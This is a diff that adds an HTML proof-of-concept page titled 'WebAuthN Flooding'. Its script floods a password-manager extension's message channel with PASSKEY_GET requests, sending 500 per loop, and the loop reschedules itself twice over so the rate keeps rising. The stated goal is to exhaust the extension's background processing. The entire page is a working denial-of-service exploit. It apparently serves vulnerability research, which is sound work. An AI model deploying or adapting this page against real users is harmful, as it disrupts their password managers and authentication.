@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WebAuthN Flooding</title>
+</head>
+<body>
+    <h1>WebAuthN Flooding</h1>
+    <p>Flooding `PASSKEY_GET` to exhaust background intervals.</p>
+    <button id="start">Start</button>
+    <button id="stop">Stop</button>
+    <div id="status">Ready</div>
+    <div id="counter">0</div>
+
+    <script>
+        let running = false;
+        let count = 0;
+        const statusDiv = document.getElementById('status');
+        const counterDiv = document.getElementById('counter');
+
+        const challengeArray = [1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6];
+        const publicKey = {
+            challenge: challengeArray,
+            rpId: location.hostname,
+            userVerification: "required",
+            timeout: 60000,
+            allowCredentials: []
+        };
+        const payloadStr = JSON.stringify(publicKey);
+
+        function flood() {
+            if (!running) return;
+            
+            for (let i = 0; i < 500; i++) {
+                const token = "dos-" + count;
+                window.postMessage({
+                    type: "Pass::MainWorld::Message",
+                    token: token,
+                    request: {
+                        type: "PASSKEY_GET",
+                        payload: { request: payloadStr }
+                    }
+                }, "*");
+                count++;
+            }
+            
+            counterDiv.innerText = "Requests sent: " + count;
+            requestAnimationFrame(flood);
+            setTimeout(flood, 0); 
+        }
+
+        document.getElementById('start').addEventListener('click', () => {
+            if (running) return;
+            running = true;
+            statusDiv.innerText = "Flooding...";
+            flood();
+        });
+
+        document.getElementById('stop').addEventListener('click', () => {
+            running = false;
+            statusDiv.innerText = "Stopped.";
+        });
+    </script>
+</body>
+</html>
